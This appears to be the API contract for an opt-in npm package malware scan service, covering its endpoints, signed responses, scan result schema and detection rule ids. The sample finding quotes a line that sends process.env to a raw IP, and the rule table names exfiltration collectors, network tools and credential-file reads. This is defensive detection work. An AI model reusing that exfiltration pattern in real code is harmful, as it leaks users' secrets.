# npryx scan service: API contract

The contract between the npryx CLI and `npryx-scan`, the optional remote scanner in
`scan-service/`. The design and its reasoning are in [scan-service.md](scan-service.md).

**Remote scanning is opt-in.** npryx never contacts a scan service unless the user
configures one. The same service runs as a hosted, paid instance or self-hosted;
the only difference is whether API keys are required.

## Opting in (client)

| Setting | Meaning |
|---|---|
| `NPRYX_SCAN_URL` | Base URL of a scan service. Unset = remote scanning off (the default). |
| `NPRYX_SCAN_TOKEN` | API key, sent as `Authorization: Bearer <token>`. Required by the hosted service, optional for self-hosted. |
| `NPRYX_SCAN_KEY` | The service's Ed25519 public key (base64, 32 bytes). Responses that don't verify against it are ignored. |
| `NPRYX_SCAN_DEEP=1` | Also opt in to the sandbox (dynamic) scan. Off by default even when scanning is on. |

The same settings can be saved with `npryx --scan-config <url> [--token <t>] [--key <k>] [--deep]`
into `~/.npryx-scan.json`; `npryx --scan-off` deletes that file. Environment variables win
over the file.

Only packages whose tarball is on the public registry (`registry.npmjs.org`) are ever
sent. Private package names never leave the machine.

## Endpoints

### `GET /v1/scan/{name}/{version}?integrity=<sri>&deep=0|1`

`{name}` is URL-encoded (`@scope%2Fpkg`). `integrity` is the `dist.integrity` npryx
resolved (`sha512-…`). `deep=1` requests the sandbox scan.

| Status | Body | Meaning |
|---|---|---|
| 200 | signed envelope, `status: "done"` | Result ready (from cache or finished within the wait budget). |
| 202 | signed envelope, `status: "pending"`, `retry_after_ms` | Scan queued; ask again later. |
| 409 | signed envelope, `status: "integrity_mismatch"`, `registry_integrity` | The registry's integrity for this version differs from what the client resolved. A red flag in itself. |
| 400 | `{ "error": "…" }` | Bad name, version or integrity. |
| 401 | `{ "error": "…" }` | Keys are required and none, or an unknown one, was sent. |
| 404 | `{ "error": "…" }` | No such package or version. |
| 413 | `{ "error": "…" }` | Tarball over the size cap. |
| 429 | `{ "error": "…" }` + `Retry-After` | Rate limit for this key or IP. |
| 502 | `{ "error": "…" }` | The registry or tarball couldn't be fetched. Clients treat it like any other failure: nothing changes. |

The server waits up to ~1.2s for a fresh scan before answering 202. Concurrent requests
for the same integrity share one scan.

### `GET /v1/pubkey`

`{ "alg": "ed25519", "key_id": "<id>", "key": "<base64 32-byte public key>" }`

### `GET /healthz`

`ok`

## Signed envelope

```json
{ "payload": "<base64 of the JSON bytes>", "sig": "<base64 Ed25519 signature over those bytes>", "key_id": "<id>" }
```

The signature covers the raw payload bytes, so no JSON canonicalisation is needed. Clients
verify, then parse the decoded payload.

## Payload: `ScanResult`

```jsonc
{
  "schema": 1,
  "status": "done",                       // "done" | "pending" | "integrity_mismatch"
  "analyzer": "npryx-scan/0.1.0",
  "name": "esbuild",
  "version": "0.28.1",
  "integrity": "sha512-…",
  "registry_integrity": null,              // set only for integrity_mismatch
  "retry_after_ms": null,                  // set only for pending
  "scanned_at": "2026-10-04T01:23:45Z",
  "previous": { "version": "0.28.0", "integrity": "sha512-…" },   // or null
  "verdict": "info",                       // "confirmed" | "suspected" | "info" | "clean"
  "findings": [
    {
      "id": "net.exfil-flow",              // stable rule id, see below
      "severity": "high",                  // "confirmed" | "high" | "medium" | "low" | "info"
      "title": "sends environment variables over the network",
      "detail": "process.env reaches the body of an https.request call",
      "phase": "install",                  // "install" | "import" | "runtime" | "unknown"
      "file": "scripts/setup.js",
      "line": 12,
      "evidence": "https.request({ host: '45.77.12.9', … }).end(JSON.stringify(process.env))",
      "destinations": ["https://45.77.12.9/c"],
      "new_since_previous": true,
      "source": "static"                   // "static" | "sandbox" | "registry" | "osv"
    }
  ],
  "network": {
    "destinations": [
      {
        "value": "45.77.12.9",
        "kind": "raw-ip",                  // raw-ip | collector | chat-webhook | paste | tunnel | registry | package-home | known-telemetry | other
        "phase": "install",
        "new_since_previous": true,
        "note": null                       // e.g. telemetry opt-out instructions
      }
    ]
  },
  "sandbox": null                          // or a SandboxReport (below) when deep=1 ran
}
```

`verdict`: any `confirmed` finding → `confirmed`; else any `high` → `suspected`; else any
finding → `info`; else `clean`. `clean` means nothing was found, never "safe".

### `SandboxReport`

```jsonc
{
  "status": "ok",                          // "ok" | "skipped" | "error" | "timeout"
  "reason": null,                          // why skipped / error
  "runs": ["dev", "ci"],                   // environments it ran under
  "attempts": [
    { "kind": "http", "target": "https://45.77.12.9/c", "phase": "install", "run": "ci",
      "payload_preview": "eyJOUE1fVE9LRU4iOi…", "canary_hits": ["npm-token"] }
    // kind: "dns" | "tcp" | "http" | "udp" | "exec"
  ],
  "file_reads": [ { "path": "~/.npmrc", "phase": "install", "run": "dev" } ],
  "duration_ms": 18234
}
```

A canary hit (a planted honeytoken found in an outbound payload, decoded) produces a
`confirmed` finding with id `sandbox.canary-exfil`.

## Rule ids

| id | severity | source |
|---|---|---|
| `sandbox.canary-exfil` | confirmed | sandbox |
| `osv.malware` (an OSV `MAL-` advisory) | confirmed | osv |
| `registry.integrity-mismatch` | confirmed | registry |
| `net.exfil-flow` (secret or env source reaches a network sink) | high | static |
| `net.collector-destination` (webhook.site, pipedream, interact.sh, discord webhooks, telegram bot API, pastebin, ngrok, …) | high | static |
| `net.raw-ip` | high at install, medium otherwise | static |
| `code.remote-eval` (fetched or decoded data reaches `eval` / `new Function`) | high | static |
| `code.ci-gated-network` (network call behind a `CI` / hostname check) | high | static |
| `script.install-added` (install hook new since previous) | high | registry |
| `provenance.dropped` (previous version had provenance, this one doesn't) | high | registry |
| `sandbox.blocked-egress` (contacted a non-registry host) | high | sandbox |
| `sandbox.secret-read` (read a planted credential file) | high | sandbox |
| `net.new-destination` | medium | static |
| `secret.read` (reads credential files or the whole env) | medium | static |
| `code.obfuscation` (high-entropy blobs, huge single lines, decode-then-run) | medium | static |
| `exec.network-tool` (spawns curl / wget / nc / powershell) | medium | static |
| `maintainers.changed` | medium | registry |
| `deps.added` | low | registry |
| `osv.vulnerability` | low | osv |
| `net.known-telemetry` | info | static |
| `net.expected-download` | info | static |

## Keys, quotas and self-hosting (server)

| Env var | Default | Meaning |
|---|---|---|
| `NPRYX_SCAN_BIND` | `127.0.0.1:8787` | Listen address. |
| `NPRYX_SCAN_CACHE_DIR` | `./cache` | Results, keyed by analyzer version + integrity. |
| `NPRYX_SCAN_SIGNING_KEY` | `./signing.key` | Ed25519 secret key file; generated on first start if missing. |
| `NPRYX_SCAN_API_KEYS` | unset | Path to a keys file. Unset = open (self-hosted default). Set = every request needs a known key. |
| `NPRYX_SCAN_REGISTRY` | `https://registry.npmjs.org` | Registry to read packuments and tarballs from. |
| `NPRYX_SCAN_SANDBOX` | `off` | `docker` enables deep scans. |
| `NPRYX_SCAN_MAX_TARBALL` | `52428800` | Unpacked size cap in bytes. |
| `NPRYX_SCAN_CONCURRENCY` | CPU-based | Concurrent static scans. |
| `NPRYX_SCAN_SANDBOX_CONCURRENCY` | `2` | Concurrent sandbox runs. |
| `NPRYX_SCAN_IP_RPM` | per-IP default | Requests per minute per client IP. |
| `NPRYX_SCAN_TRUST_PROXY` | off | Read the client IP from `X-Forwarded-For` (only behind a proxy you control). |
| `NPRYX_SCAN_OSV` | `https://api.osv.dev` | OSV endpoint, or `off`. |

Destinations may contain `§` where part of a URL is computed at runtime and couldn't be resolved statically.

Keys file: one key per line, `<key> <requests-per-minute> <label>`. The server logs one
JSON usage line per request (`key label`, package, cache hit or miss, deep or not) to
stdout, which is what a hosted service meters and bills from.
